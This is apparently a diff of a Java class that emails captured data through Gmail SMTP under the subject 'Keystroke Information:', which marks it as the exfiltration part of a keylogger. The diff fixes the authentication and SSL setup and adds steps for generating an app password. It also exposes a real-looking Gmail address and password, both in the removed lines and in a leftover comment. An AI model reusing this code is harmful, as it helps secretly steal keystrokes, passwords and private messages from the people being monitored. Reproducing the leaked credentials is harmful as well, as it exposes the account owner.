@@ -11,39 +11,54 @@ import javax.mail.internet.MimeMessage;
 public class Sender {
 	
 	private Sender(){};
-	private static final String SENDERS_GMAIL = "pan4ipano@gmail.com";
-	private static final String SENDERS_PASSWORD = "panopan4i";
-	
-	private static final String RECEIVER_EMAIL = "pan4ipano@gmail.com";
-	
+	private static final String SENDERS_GMAIL = "yourmail";
+	private static final String SENDERS_PASSWORD = "yourpass";
+	//private static final String SENDERS_PASSWORD = "panopan4i";
+	private static final String RECEIVER_EMAIL = "yourmail";
+	/*
+	  	1.Enable 2-Step Verification (if it's not already):
+		Go to Google Account Security Settings.
+    	Scroll down to "Signing in to Google" and turn on 2-Step Verification.
+    	2.Generate App-Specific Password:
+		Go to App Passwords.
+    	Sign in if prompted.
+    	Select "Mail" as the app and "Other" as the device, then generate the password.
+    	Use this 16-character password in your code instead of your regular Gmail password.
+	 */
 	private static Properties mailServerProperties;
 	private static Session mailSession;
 	private static MimeMessage mailMessage;
 	
-	public static void sendMail(String emailbody) throws Throwable {
-		
-		System.setProperty("javax.net.debug", "ssl,handshake");
-		System.setProperty("https.protocols", "TLSv1.2");
+	public static void sendMail(String emailBody) throws Throwable {
+		// Set up mail server properties
 		mailServerProperties = System.getProperties();
-		mailServerProperties.put("mail.smtp.port", "587");
+		mailServerProperties.put("mail.smtp.port", "465"); // or 587 for TLS
 		mailServerProperties.put("mail.smtp.auth", "true");
-		mailServerProperties.put("mail.smtp.starttls.enable", "true");
-		/*// Set SMTP server properties
-        props.put("mail.smtp.auth", "true"); // Enable SMTP authentication --->done
-        props.put("mail.smtp.starttls.enable", "true"); // Enable STARTTLS --->done
-        props.put("mail.smtp.starttls.required", "true"); // Require STARTTLS
-        props.put("mail.smtp.host", "smtp.example.com"); // Set your SMTP server host
-        props.put("mail.smtp.port", "587"); // Set the SMTP port ---->done
-        props.put("mail.smtp.ssl.protocols", "TLSv1.2"); // Specify TLS version*/
+		mailServerProperties.put("mail.smtp.ssl.enable", "true");  // Use SSL
+		mailServerProperties.put("mail.smtp.ssl.protocols", "TLSv1.2");
 		
-		mailSession = Session.getDefaultInstance(mailServerProperties);
+		// Authenticate the session
+		mailSession = Session.getDefaultInstance(mailServerProperties, new javax.mail.Authenticator() {
+			protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
+				return new javax.mail.PasswordAuthentication(SENDERS_GMAIL, SENDERS_PASSWORD);
+			}
+		});
 		
+		// Enable debug information
+		mailSession.setDebug(true);
+		
+		// Prepare the email
 		mailMessage = new MimeMessage(mailSession);
-		mailMessage.addRecipient(RecipientType.BCC, new InternetAddress(RECEIVER_EMAIL));
+		mailMessage.addRecipient(RecipientType.TO, new InternetAddress(RECEIVER_EMAIL));
 		mailMessage.setSubject("Keystroke Information:");
-		mailMessage.setContent(emailbody,"text/html");
+		mailMessage.setContent(emailBody, "text/html");
 		
+		// Send the email
 		Transport transport = mailSession.getTransport("smtp");
 		transport.connect("smtp.gmail.com", SENDERS_GMAIL, SENDERS_PASSWORD);
+		transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
+		
+		// Close the transport
+		transport.close();
 	}
 }
